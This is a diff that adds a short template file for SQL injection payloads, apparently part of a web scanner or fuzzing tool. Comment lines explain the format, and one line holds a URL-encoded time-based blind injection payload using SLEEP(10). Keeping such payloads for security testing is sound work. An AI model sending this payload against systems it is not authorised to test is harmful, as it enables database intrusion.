@@ -1,0 +1,4 @@
+;template file for SqlInjection payload
+;comments start with semicolon
+;payloads should be added line by line
+%20and%201%20in%20(select%20SLEEP(10))
